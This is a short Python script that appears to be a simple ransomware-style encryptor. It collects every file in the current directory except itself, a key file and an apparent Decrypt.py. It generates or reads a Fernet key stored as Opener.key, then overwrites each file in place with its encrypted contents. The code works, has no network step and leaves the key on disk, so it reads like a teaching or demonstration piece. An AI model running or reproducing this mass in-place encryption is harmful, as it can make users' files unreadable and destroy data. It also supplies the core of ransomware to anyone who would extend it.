import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file in ("Encrypt.py", "Opener.key", "Decrypt.py"):
        continue
    if os.path.isfile(file):
        files.append(file)

print("Files to encrypt:", files)

if not os.path.exists("Opener.key"):
    key = Fernet.generate_key()
    with open("Opener.key", "wb") as opener:
        opener.write(key)
else:
    with open("Opener.key", "rb") as opener:
        key = opener.read()

for file in files:
    try:
        with open(file, "rb") as target:
            contents = target.read()  
        contents_encrypt = Fernet(key).encrypt(contents)  
        with open(file, "wb") as target:
            target.write(contents_encrypt)  
        print(f"Encrypted: {file}")
    except Exception as e:
        print(f"Error encrypting {file}: {e}")
